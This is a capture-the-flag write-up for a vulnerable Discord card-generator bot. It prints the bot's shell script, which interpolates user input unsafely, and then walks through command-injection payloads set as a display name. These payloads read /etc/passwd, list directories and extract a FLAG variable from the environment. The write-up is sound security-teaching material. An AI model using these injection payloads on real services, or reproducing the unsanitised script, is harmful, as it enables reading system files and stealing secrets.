Remember Joe Dohn from last year ? He is back with a new concept now:Â **N0PS TCG**. Try to get in touch with him, he will tell you more about that! I heard he roams around on the Discord server...

# Solve

It appears to be a vulnerable bot.
My teammate found we could dump the source with !devlog

```
#!/bin/bash

#os.popen(f"/app/create_card.sh '{card_class}' '{display_name}' '{discord_tag}' '{', '.join(card_abilities)}' '{profile_picture}' '{id}' '{card_rarity_name}'")

find /tmp -iname *.pdf -delete 2>/dev/null
find /tmp -iname *.html -delete 2>/dev/null

uuid=$(cat /proc/sys/kernel/random/uuid)

cat /app/template.html \
| sed -e "s/card_class/${1}/g" \
| sed -e "s/display_name/${2}/g" \
| sed -e "s/discord_tag/${3}/g" \
| sed -e "s/abilities/${4}/g" \
| sed -e "s/profile_picture/${5}/g" \
| sed -e "s/card_id/${6}/g" \
| sed -e "s/card_rarity/${7}/g" \
> /tmp/$uuid.html

python3 -c "import weasyprint; weasyprint.HTML('/tmp/${uuid}.html').write_pdf('/tmp/${uuid}.pdf')"

pdftoppm -singlefile -jpeg -r 300 /tmp/$uuid.pdf /tmp/$uuid

echo /tmp/$uuid.jpg
```

We have access to the "display_name" variable through changing our display name on discord. After trying a bunch of options I found the following were able to achieve command injection

```
'$(ls)'
'$(cat /etc/passwd)'
```

But it appears to break as it responds with a blank image which means it appears to be breaking the overall script due to the output. After trying a bunch of inputs I got something that actually generated an image.

```
'$(ls | wc -l)'
```

Which counts the files and sets that as our display name. This doesn't contain any special chars and isn't super long so it was able to work.

Next we can start outputting the files one by one doing the following

```
'$(ls|head -1)'
```

Which gets us the name of the directory "assets" trying to do it with the first two lines of output breaks it probably due to the new line

![](Images/Pasted%20image%2020250531122137.png)

We can use the following the start grabbing each file

```
'$(ls|head -1)'           # file 1/6
'$(ls|head -2|tail -1)'   # file 2/6
'$(ls|head -3|tail -1)'   # file 3/6
'$(ls|head -4|tail -1)'   # file 4/6
'$(ls|head -5|tail -1)'   # file 5/6
'$(ls|tail -1)'           # file 6/6 (last file)
```


Directory 
- Assets
	- Card1.png
	- CardBG.png
	- Cards
		- CryptoBronze.png
		- Cryptocristal.png
		- Websilver.png
		- Webgold
- Create_card.sh
- devlog.txt
- Main_Py
- requirements.txt
- Template.HTML

```
'$(ls assets| wc -l)'
```

3 objects within assets

```
'$(ls assets|head -1)'           # file 1/6
'$(ls assets|head -2|tail -1)'   # file 2/6
'$(ls assets|head -3|tail -1)'   # file 3/6
```

We find another directory called cards we have to limit our username input to a specific size so we have to use sed instead to print specific lines

```
'$(ls assets/cards|sed -n 1p)'
'$(ls assets/cards|sed -n 2p)'
'$(ls assets/cards|sed -n 3p)'
'$(ls assets/cards|sed -n 4p)'
'$(ls assets/cards|sed -n 5p)'
'$(ls assets/cards|sed -n 6p)'
'$(ls assets/cards|sed -n 7p)'
'$(ls assets/cards|sed -n 8p)'
'$(ls assets/cards|sed -n 9p)'
'$(ls assets/cards|sed -n 10p)'
'$(ls assets/cards|sed -n 11p)'
'$(ls assets/cards|sed -n 12p)'
'$(ls assets/cards|sed -n 13p)'
'$(ls assets/cards|sed -n 14p)'
'$(ls assets/cards|sed -n 15p)'
'$(ls assets/cards|sed -n 16p)'
```

Just appears to be a bunch of image files

Using `'$(basename $(pwd))'` we know that we are within the app directory. After brute forcing I remembered the devlog says the secrets are in the env

![](Images/Pasted%20image%2020250531124159.png)


```
'$(env|grep -c N0PS)'
```

![](Images/Pasted%20image%2020250531124221.png)

This confirms its in the env.

```
'$(env|grep N0PS|cut -d= -f1)'
```

![](Images/Pasted%20image%2020250531124259.png)

The variable name is FLAG now lets just print that

```
'$(echo $FLAG)'
```

![](Images/Pasted%20image%2020250531124330.png)

Which gets our flag

```
N0PS{W0ULD_U_7R4D3_Y0UR_C4RDZ_W1TH_M3?}
```

I was able to be the 4th one to solve this challenge.
